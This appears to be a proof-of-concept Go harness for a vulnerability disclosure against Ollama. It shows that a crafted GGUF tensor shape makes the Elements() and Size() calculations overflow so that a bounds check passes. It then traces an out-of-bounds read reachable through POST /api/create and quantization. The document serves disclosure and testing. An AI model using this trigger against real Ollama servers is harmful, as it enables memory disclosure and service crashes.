
//go:build ignore

package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"

	fsggml "github.com/ollama/ollama/fs/ggml"
)

// Replicate Elements() / Size() to confirm the overflow in Go's own type system.
func main() {
	const dim0 = uint64(0x4000000000000001)
	const dim1 = uint64(1)

	// --- Step A: prove the arithmetic using Go's native uint64 semantics ---
	shape := []uint64{dim0, dim1}
	var elems uint64 = 1
	for _, n := range shape {
		elems *= n // unchecked -- wraps in Go just as in Elements()
	}
	typeSize  := uint64(4) // F32
	blockSize := uint64(1)
	sz := elems * typeSize / blockSize

	fmt.Printf("[go-harness] Elements() = %d (0x%016x)\n", elems, elems)
	fmt.Printf("[go-harness] Size()     = %d (0x%016x)\n", sz, sz)
	if sz != 4 {
		fmt.Fprintf(os.Stderr, "UNEXPECTED: Size()=%d, wanted 4\n", sz)
		os.Exit(1)
	}
	fmt.Println("[go-harness] Size() wraps to 4 -- bounds check bypassed")

	// --- Step B: parse the crafted GGUF through the real fsggml.Decode ---
	ggufPath := os.Args[1]
	f, err := os.Open(ggufPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "open: %v\n", err)
		os.Exit(1)
	}
	defer f.Close()

	ggml, err := fsggml.Decode(f, -1)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[go-harness] Decode error: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("[go-harness] fsggml.Decode() accepted the crafted GGUF (bounds check bypassed)")

	tensors := ggml.Tensors().Items()
	if len(tensors) == 0 {
		fmt.Fprintln(os.Stderr, "no tensors parsed")
		os.Exit(1)
	}
	t := tensors[0]
	fmt.Printf("[go-harness] tensor %q  Shape=%v  Kind=%d\n", t.Name, t.Shape, t.Kind)
	fmt.Printf("[go-harness] tensor.Elements()=%d  tensor.Size()=%d\n", t.Elements(), t.Size())

	if t.Size() != 4 {
		fmt.Fprintf(os.Stderr, "UNEXPECTED tensor.Size()=%d\n", t.Size())
		os.Exit(1)
	}
	if t.Elements() != dim0 {
		fmt.Fprintf(os.Stderr, "UNEXPECTED tensor.Elements()=%d\n", t.Elements())
		os.Exit(1)
	}

	// --- Step C: show the unsafe.Slice header that would be created ---
	// We only construct the slice header (runtime.SliceHeader) via reflect/unsafe --
	// we do NOT dereference it, to avoid SIGSEGV in the PoC itself.
	// The demonstration is that after Decode succeeds, the server/quantization.go
	// code will reach:
	//   f32s = unsafe.Slice((*float32)(unsafe.Pointer(&data[0])), q.from.Elements())
	// with q.from.Elements() = 0x4000000000000001 backed by only 4 bytes of data.
	_ = bytes.NewReader(nil)
	_ = binary.LittleEndian
	fmt.Printf("\n[go-harness] CONFIRMED: after Decode, unsafe.Slice(ptr, %d) would be created\n", t.Elements())
	fmt.Printf("             backed by only %d bytes -> OOB read of ~%d GB into adjacent memory\n",
		t.Size(), t.Elements()*4/1024/1024/1024)
	fmt.Println("[go-harness] exploit path: POST /api/create -> quantize() -> quantizer.WriteTo()")
	fmt.Println("             -> io.ReadAll (reads 4 bytes) -> len(data) >= Size() (4 >= 4) -> PASS")
	fmt.Println("             -> unsafe.Slice(ptr, Elements()) -> OOB slice header created")
	fmt.Println("             -> ggml.ConvertToF32 / cgo dequantize -> OOB READ in C code")
	fmt.Println("\n[go-harness] STATUS: BOUNDS CHECK BYPASSED, OOB SLICE CREATED")
}
